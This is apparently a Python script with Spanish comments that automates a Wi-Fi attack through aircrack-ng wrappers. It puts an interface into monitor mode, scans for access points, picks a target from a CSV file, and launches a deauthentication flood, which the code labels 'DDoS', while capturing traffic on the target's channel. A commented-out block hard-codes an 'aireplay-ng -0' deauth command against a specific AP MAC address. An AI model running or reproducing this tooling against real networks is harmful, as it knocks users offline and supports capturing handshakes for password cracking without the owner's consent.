# Dep
from rich.console import Console
from rich.prompt import Prompt
import pyrcrack
import subprocess as sp
import os
# Local
import wifi_class as wifi
from csv_handler import csv_handler
from threading import Thread


def main():

    interface = 'wlp2s0'

    # Primera parte: Configurar tarjeta en modo monitor
    airmon = wifi.Airmon(interface)
    try:
        airmon.monitor_mode()
        print('[Iniciando modo monitor]')
    except:
        print('[Nombre de interfaz mal escrito o ya esta en modo monitor]')

    # Segunda parte: Iniciar el escaneo para detectar todas las APs disponibles
    airodump = wifi.Airodump(interface+'mon')
    print('[Escaneo de APs iniciando...]')
    print('[ctl + c para salir]')
    try:
        airodump.general_scan()
    except KeyboardInterrupt:
        pass
    option = csv_handler('general_scan-01.csv')
    os.system('rm general_scan-01.csv')
    target = {
        'AP_MAC': option[0],
        'Channel': option[1].strip(),
        'Privacy': option[3],
        'Cipher': option[4],
        'Authetication': option[5],
        'ESSID': option[6],
    }

    # Tercera parte: Iniciar escaneo del canal del AP escogido
    aireplay = wifi.Aireplay(target, interface+'mon')
    try:
        res = Thread(target=aireplay.DDoS)
        res.start()
        print(f"[Iniciando escaneo en canal {target['Channel']}]")
        airodump.AP_scan(target['Channel'], target['AP_MAC'], target['ESSID'])
        print(
            f"[Iniciando DDoS al AP: {target['ESSID']} dir. MAC {target['AP_MAC']}]")
    except KeyboardInterrupt:
        print('[Terminando...]')
        option = csv_handler(f"AP-01.csv")
        pass
    os.system('airmon-ng stop wlp2s0mon')


if __name__ == '__main__':
    # command = 'aireplay-ng'
    # interface = 'wlp2s0mon'
    # ap = '24:7E:51:8E:5D:7A'
    # out = sp.check_output([command, '-0', '20', '-a',
    #                        ap, interface])
    # print(out)
    main()
